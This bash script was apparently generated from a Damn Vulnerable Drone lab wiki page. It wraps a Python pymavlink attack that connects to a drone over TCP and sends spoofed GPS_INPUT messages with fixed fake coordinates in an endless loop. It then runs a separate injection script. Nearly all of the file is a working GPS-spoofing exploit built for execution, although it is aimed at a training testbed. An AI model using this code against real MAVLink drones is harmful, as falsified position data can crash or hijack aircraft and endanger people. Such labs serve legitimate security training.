#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/GPS-Data-Injection.md
# Created: 2025-11-23 15:43:26
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=gps-data-injection src=GPS-Data-Injection.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
import time

def inject_fake_gps():
    mav = mavutil.mavlink_connection('tcp:10.13.0.3:5760')
    mav.wait_heartbeat()
    print("[+] Connected to drone")

    while True:
        mav.mav.gps_input_send(
            time_usec=int(time.time() * 1e6),
            gps_id=1,  # Secondary GPS
            ignore_flags=0,
            time_week=0,
            time_week_ms=0,
            fix_type=3,
            lat=473566100,
            lon=854619300,
            alt=500,
            hdop=50,
            vdop=50,
            vn=0,
            ve=0,
            vd=0,
            speed_accuracy=0,
            horiz_accuracy=0,
            vert_accuracy=0,
            satellites_visible=10,
            yaw=0
        )
        print("[!] Injected spoofed GPS_INPUT (gps_id=1)")
        time.sleep(1)

if __name__ == "__main__":
    inject_fake_gps()
PY

log "[BLOCK 2] type=shell"
python3 gps_injection.py

